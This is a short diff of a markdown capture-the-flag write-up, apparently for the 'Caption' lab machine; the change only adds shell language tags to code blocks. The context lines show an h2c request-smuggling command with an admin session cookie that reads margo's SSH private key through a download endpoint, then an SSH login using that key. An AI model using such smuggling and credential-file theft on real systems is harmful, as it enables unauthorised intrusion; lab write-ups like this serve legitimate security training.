@@ -45,7 +45,7 @@ I used a Python tool called `h2csmuggler`. In the server, there is a .cpr direct
 python3 h2csmuggler.py -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM1MjE4NzUyfQ.d4-wtGXYkoY69q2ZsDfG0u5asuW35hH6d-rLuRW69Y0" -X GET -x http://caption.htb/ http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa
 ```
 We can use this to download the `id_ecdsa` private key in order to log into margo with SSH.
-```
+```sh
 chmod 600 id_ecdsa
 ssh -i id_ecdsa margo@caption.htb
 ```
@@ -58,7 +58,7 @@ If we check on the GitBucket service again, we see a LogService repo, and if we 
 Below are the steps.
 In the host PC:
 
-```
+```sh
 cd /tmp
 touch client.py
 touch log_service.thrift
